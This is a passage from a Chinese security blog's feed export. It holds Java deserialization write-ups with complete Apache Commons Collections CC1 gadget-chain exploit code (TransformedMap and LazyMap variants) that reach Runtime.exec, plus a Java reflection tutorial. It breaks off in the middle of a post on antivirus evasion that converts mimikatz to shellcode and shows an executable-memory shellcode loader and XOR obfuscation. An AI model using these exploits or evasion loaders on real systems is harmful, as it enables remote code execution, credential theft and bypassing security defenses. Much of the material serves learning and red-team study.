class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain); <span class="comment">//串联多个Transformer</span></span><br><span class="line">        <span class="comment">//一个 Map 装饰器，其值的访问会触发 ChainedTransformer。</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler：一个动态代理，用于处理注解的方法调用，在反序列化时触发 Transformer 链。</span></span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;       <span class="comment">//注解类</span></span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream  oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);<span class="comment">//序列化</span></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();<span class="comment">//反序列化</span></span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler 的反序列化过程触发 TransformedMap 的值访问，进而触发 ChainedTransformer。</span></span><br><span class="line">        <span class="comment">//通过 Transformer 链最终调用 Runtime.exec 方法，执行攻击者指定的命令</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="s1CWN"></a></p><h4 id="Gadget-1"><a href="#Gadget-1" class="headerlink" title="Gadget"></a>Gadget</h4><ol><li><strong>构造恶意对象</strong>：攻击者创建一个包含恶意代码的集合对象，比如一个 Map。</li><li><strong>利用 Transformer</strong>：通过 Commons Collections 中的 Transformer 类，攻击者可以定义一个转换逻辑，这个逻辑在反序列化时执行。</li><li><strong>利用 AnnotationInvocationHandler</strong>：AnnotationInvocationHandler 是 Java 中的一个私有类，它可以被用来调用任何方法。通过构造特定的 Transformer，攻击者可以触发 AnnotationInvocationHandler 的构造函数。</li><li><strong>执行 Runtime.exec</strong>：通过 AnnotationInvocationHandler，攻击者可以调用 Runtime 类的 exec 方法，从而执行任意命令。</li></ol><p>核心逻辑就是memberValues.entrySet()和memberValue.setValue()。<br />memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这⾥遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap⾥注册的 Transform，进而执行我们为其精心设计的任意代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt; <span class="built_in">Map</span>.entrySet()/setValue()</span><br><span class="line">    -&gt; TransformedMap.setValue()</span><br><span class="line">      -&gt; ChainedTransformer.transform()</span><br><span class="line">        -&gt; ConstantTransformer.transform()</span><br><span class="line">          -&gt; InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p><a name="jOMiC"></a></p><h3 id="LazyMap-poc"><a href="#LazyMap-poc" class="headerlink" title="LazyMap-poc"></a>LazyMap-poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123; String.class&#125;, new String[] &#123;"c:\\windows\\system32\\calc.exe" &#125;),&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//将多个 Transformer 对象串联起来，形成一个完整的调用链。</span></span><br><span class="line">        <span class="comment">//InvokerTransformer，执⾏Runtime对象的exec⽅法，参数为"c:\\windows\\system32\\calc.exe"</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<span class="comment">//串联多个Transformer</span></span><br><span class="line">        <span class="comment">//利用TransformedMap.decorate()方法来将ChainedTransformer设置为map装饰器的处理方法</span></span><br><span class="line">        <span class="comment">//惰性地将 ChainedTransformer 应用到 Map 上。</span></span><br><span class="line">        <span class="comment">// 使用了 LazyMap 来装饰内部 HashMap。LazyMap 与 TransformedMap 类似，但它在访问不存在的键时才会应用转换逻辑，这被称为惰性转换。</span></span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler：一个动态代理，用于处理注解的方法调用，在反序列化时触发 Transformer 链。</span></span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;       <span class="comment">//注解类</span></span><br><span class="line"></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">proxyMap</span>)</span>;</span><br><span class="line">        <span class="comment">//通过 Proxy.newProxyInstance 创建了一个 Map 的动态代理，并将 LazyMap 作为其背后的实际 Map 实例传递给 AnnotationInvocationHandler。</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream  oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);<span class="comment">//序列化</span></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler 的反序列化过程触发 TransformedMap 的值访问，进而触发 ChainedTransformer。</span></span><br><span class="line">        <span class="comment">//通过 Transformer 链最终调用 Runtime.exec 方法，执行攻击者指定的命令</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><strong>创建 Transformer 链</strong>：<ul><li>代码首先定义了一系列的 Transformer 对象，这些对象可以按顺序执行特定的操作。它们被用来获取 Runtime 类的实例，并调用它的 exec 方法来执行一个命令（在这个例子中是打开计算器程序）。</li></ul></li><li><strong>构建 LazyMap</strong>：<ul><li>然后，代码使用 LazyMap 来装饰一个 HashMap。LazyMap 是一种特殊的 Map，它允许你定义一个转换器（在这里是上面创建的 Transformer 链），这个转换器会在你访问 Map 中的值时被调用。</li></ul></li><li><strong>创建动态代理</strong>：<ul><li>接下来，代码使用 Java 的动态代理功能来创建 Map 的一个代理。这个代理背后的实际逻辑是由 AnnotationInvocationHandler 来处理的，它将 LazyMap 作为参数。</li></ul></li><li><strong>序列化和反序列化</strong>：<ul><li>代码将动态代理序列化到一个字节流中，然后再次反序列化。这个过程触发了 AnnotationInvocationHandler 的构造函数，它需要一个 Map 作为参数。由于 LazyMap 被用作这个 Map，因此在反序列化时，它会被激活。</li></ul></li><li><strong>触发漏洞</strong>：<ul><li>当 LazyMap 被激活时，它会尝试应用定义的 Transformer 链。由于这个链最终调用了 Runtime.exec 方法，这导致了任意代码的执行。<br><a name="yFnXy"></a></li></ul></li></ol><h4 id="Gadget-2"><a href="#Gadget-2" class="headerlink" title="Gadget"></a>Gadget</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt; <span class="built_in">Map</span>(<span class="built_in">Proxy</span>).entrySet()</span><br><span class="line">    -&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">      -&gt; LazyMap.get()</span><br><span class="line">        -&gt; ChainedTransformer.transform()</span><br><span class="line">          -&gt; ConstantTransformer.transform() </span><br><span class="line">            -&gt; InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p><a name="rPLGK"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/N0r4h/p/15840776.html" target="_blank" rel="noopener">URLDNS链分析 - N0r4h - 博客园</a><br /><a href="https://www.cnblogs.com/1vxyz/p/17231164.html" target="_blank" rel="noopener">Java反序列化初探+URLDNS链 - 1vxyz - 博客园</a><br /><a href="https://www.anquanke.com/post/id/261724#h2-11" target="_blank" rel="noopener">URLDNS链&amp;CommonsCollections链详细分析-安全客 - 安全资讯平台</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a name=&quot;q3r26&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;反序列化是什么&quot;&gt;&lt;a href=&quot;#反序列化是什么&quot; class=&quot;headerlink&quot; title=&quot;反序列化是什么&quot;&gt;&lt;/a&gt;反序列化是什么&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;序列化（Serialization）&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;序列化是将对象的状态信息转换为可以存储或传输的形式的过程。在 Java 中，这通常意味着将对象转换为字节序列，以便可以将其写入文件、数据库或通过网络发送到另一个系统。&lt;/li&gt;
&lt;li&gt;Java 通过实现 java.io.Serializable 接口来标识一个类是可序列化的。实现 Serializable 接口的类可以被 ObjectOutputStream 类序列化。&lt;/li&gt;
&lt;li&gt;序列化过程中，对象的类、属性和属性值都会被保存。如果对象图中包含其他对象的引用，这些对象也会被递归地序列化。&lt;/li&gt;
&lt;li&gt;序列化的结果是一个字节流，通常保存在  ByteArrayOutputStream 或 FileOutputStream 中。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;反序列化（Deserialization）&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;反序列化是序列化过程的逆过程。它涉及将保存的字节序列恢复为原来的对象状态。&lt;/li&gt;
&lt;li&gt;在 Java 中，反序列化通常是通过 ObjectInputStream 类来完成的。这个类可以读取先前序列化的对象，并重建原始对象的状态。&lt;/li&gt;
&lt;li&gt;反序列化时，需要确保序列化对象的类定义在当前运行环境中是可用的。如果类定义不可用，或者类的结构在序列化后发生了不兼容的变化，反序列化将失败，并可能抛出异常。&lt;/li&gt;
&lt;li&gt;反序列化后，对象将恢复其原始状态，包括所有属性值和关联的对象引用。&lt;br&gt;&lt;a name=&quot;eq60t&quot;&gt;&lt;/a&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://chenzidu.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-反射篇</title>
    <link href="https://chenzidu.github.io/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84%E7%AF%87/"/>
    <id>https://chenzidu.github.io/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84%E7%AF%87/</id>
    <published>2024-04-24T09:08:09.000Z</published>
    <updated>2024-04-24T09:13:15.435Z</updated>
    
    <content type="html"><![CDATA[<p><a name="MbNdf"></a></p><h1 id="什么是java反射？"><a href="#什么是java反射？" class="headerlink" title="什么是java反射？"></a>什么是java反射？</h1><p>Java反射（Reflection）是Java编程语言的一个强大特性，它允许程序在运行时访问和操作类、接口、字段、方法等的元数据。反射API提供了一组类和方法，使得程序能够查询和使用类的信息，以及在运行时动态地创建对象、调用方法、访问字段等。<br />使用Java反射，你可以实现以下功能：</p><blockquote><ol><li>在运行时获取类的信息：可以通过Class类或Class.forName()方法获取类的Class对象，然后查询类的定义信息，如类名、父类、实现的接口、构造函数、字段和方法等。</li><li>动态创建对象实例：使用Class对象的newInstance()方法可以创建类的实例，即使在编译时不知道具体的类名。</li><li>动态调用方法：可以通过Method对象的invoke()方法动态地调用对象的方法，无论这些方法是公共的、受保护的、默认的还是私有的。</li><li>动态访问和修改字段：使用Field对象可以动态地读取或修改对象的字段值，无论字段的访问权限如何。</li><li>创建代理对象：利用InvocationHandler和Proxy类，可以在运行时创建接口的代理实例，而无需在编译时定义具体的实现类。</li></ol></blockquote><p><a name="pi4CX"></a></p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取Class对象</span></span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用getMethod获取Runtime类的getRuntime().exec方法</span></span><br><span class="line">            Method getRuntimeMethod = clazz.getMethod(<span class="string">"getRuntime"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用invoke方法动态调用getRuntime方法</span></span><br><span class="line">            Object result = getRuntimeMethod.invoke(clazz);</span><br><span class="line">            Method execMethod = clazz.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            execMethod.invoke(result,<span class="string">"calc.exe"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84%E7%AF%87/1.png" class=""><p><a name="f1j6n"></a></p><h2 id="简化写法"><a href="#简化写法" class="headerlink" title="简化写法"></a>简化写法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">clazz.getMethod("exec",String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz),"calc.exe");</span><br></pre></td></tr></table></figure><p>这里用到了 getMethod 和 invoke 方法。<br><a name="zhyqi"></a></p><h1 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h1><p>在Java中，getMethod是java.lang.Class类的一个方法，它用于在运行时获取类中特定名称和参数类型的Method对象。这个Method对象代表了类中的一个方法。<br />getMethod 的作用是通过反射获取一个类的某个特定的公有方法。使用getMethod方法，你可以在运行时动态地调用一个对象的方法，即使在编译时你不知道具体要调用哪个方法。getMethod方法有几种重载形式，最常见的两种是：</p><ol><li>getMethod(String name)：通过方法名获取一个无参方法。</li><li>getMethod(String name, Class&lt;?&gt;… parameterTypes)：通过方法名和参数类型数组获取一个方法。</li></ol><p>我们使用最简单的，也就是第一个，它只有一个参数，类型是String，所以我们使用getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。  <br /></p><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84%E7%AF%87/2.png" class=""><p><br />这个例子中我们首先获取了String类的Class对象，然后使用getMethod方法获取了getRuntime方法的Method对象。最后，我们通过invoke方法动态地调用了exec()方法，并打印了结果。<br><a name="wwscE"></a></p><h1 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h1><p>在Java中，invoke方法是java.lang.reflect.Method类的一个方法，它用于动态调用一个对象的方法。这个方法是Java反射机制的一部分，允许程序在运行时确定和调用方法，而不需要在编译时硬编码方法的调用。<br />invoke方法的基本语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br></pre></td></tr></table></figure><ul><li>obj 参数是要在其上调用方法的对象。如果方法是一个静态方法，那么这里传入的是类本身（Class 对象）。</li><li>args 参数是一个可变参数，包含了要传递给方法的参数。如果调用的方法不需要参数，这里可以传入一个空数组。</li></ul><p>invoke 方法可能会抛出几个异常：</p><ul><li>IllegalAccessException：如果方法不可访问，比如它是私有的。</li><li>InvocationTargetException：如果方法本身抛出了异常，这个异常会被封装在InvocationTargetException中。可以通过调用getCause方法来获取原始的异常。</li><li>IllegalArgumentException：如果传递给invoke的参数不正确，比如参数数量不匹配或者类型不兼容。</li></ul><p>使用例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokeExample</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">MyClass math = <span class="keyword">new</span> MyClass(); <span class="comment">// 创建一个Math类的对象</span></span><br><span class="line">Method method = MyClass.class.getMethod("add", int.class, int.class);   // 获取Math类的add方法</span><br><span class="line">Object result = method.invoke(math, <span class="number">5</span>, <span class="number">3</span>); <span class="comment">// 动态调用add方法</span></span><br><span class="line">System.out.println(<span class="string">"Result: "</span> + result); <span class="comment">// 输出结果</span></span><br><span class="line"></span><br><span class="line">Method staticMethod = MyClass.class.getMethod("staticMethod"); // 另一个例子：调用静态方法</span><br><span class="line">Object staticResult = staticMethod.invoke(<span class="keyword">null</span>);</span><br><span class="line">System.out.println(<span class="string">"Static Result: "</span> + staticResult);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">staticMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Hello from static method!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先通过getMethod获取了MyClass的add方法和staticMethod方法的Method对象。然后，我们使用invoke方法分别调用了这两个方法，并打印了结果。对于staticMethod，我们传入null作为第一个参数，因为静态方法不需要对象实例就可以调用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a name=&quot;MbNdf&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;什么是java反射？&quot;&gt;&lt;a href=&quot;#什么是java反射？&quot; class=&quot;headerlink&quot; title=&quot;什么是java反射？&quot;&gt;&lt;/a&gt;什么是java反射？&lt;/h1&gt;&lt;p&gt;Java反射（Ref</summary>
      
    
    
    
    
    <category term="JAVA" scheme="https://chenzidu.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>C++变形免杀初探（三）</title>
    <link href="https://chenzidu.github.io/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://chenzidu.github.io/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2024-03-11T07:09:02.000Z</published>
    <updated>2024-03-11T07:42:53.095Z</updated>
    
    <content type="html"><![CDATA[<p>最近一段时间都在忙着红队项目和攻防类项目，一直没时间去把笔记脱敏转成博客。以后随缘更新吧，有些东西太容易被溯源了….</p><a id="more"></a><p><a name="HATC5"></a></p><h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><p><a name="IOUfU"></a></p><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><p>分离免杀应该是最简单的免杀方式，毕竟shellcode都在其他文件中，静态查杀也只能查加载器。我们直接将mimiktz在github中的程序进行shellcode转换。<br />使用项目：<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="noopener">https://github.com/hasherezade/pe_to_shellcode</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">pe2shc</span><span class="selector-class">.exe</span> .\<span class="selector-tag">mimikatz_64</span><span class="selector-class">.exe</span> <span class="selector-tag">mim_64</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/1.png" class=""><p><br />简单写一个shellcode加载器</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* exec = VirtualAlloc(<span class="number">0</span>, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (exec == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    perror(<span class="string">"VirtualAlloc"</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(exec, data, payload_len);</span><br><span class="line">dncrypt((<span class="keyword">char</span>*)exec, payload_len, <span class="built_in">buffer</span> + (<span class="built_in">strlen</span>(<span class="built_in">buffer</span>) - <span class="number">8</span>), <span class="number">8</span>);</span><br><span class="line"><span class="comment">// 转换为函数指针并执行</span></span><br><span class="line"><span class="keyword">void</span> (*func)() = (<span class="keyword">void</span> (*)())exec;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure><p><a name="ahiOz"></a></p><h2 id="xor加密部分"><a href="#xor加密部分" class="headerlink" title="xor加密部分"></a>xor加密部分</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void XOR(char* data, size_t data_len, char* key, size_t key_len) &#123;</span><br><span class="line">    int <span class="built_in">j</span>;</span><br><span class="line">    <span class="built_in">j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (int <span class="built_in">i</span> = <span class="number">0</span>; <span class="built_in">i</span> &lt; data_len; <span class="built_in">i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">j</span> == key_len - <span class="number">1</span>) <span class="built_in">j</span> = <span class="number">0</span>;</span><br><span class="line">        data[<span class="built_in">i</span>] = data[<span class="built_in">i</span>] ^ key[<span class="built_in">j</span>];</span><br><span class="line">        <span class="built_in">j</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="etenN"></a></p><h2 id="文件加载部分"><a href="#文件加载部分" class="headerlink" title="文件加载部分"></a>文件加载部分</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">inputFile</span><span 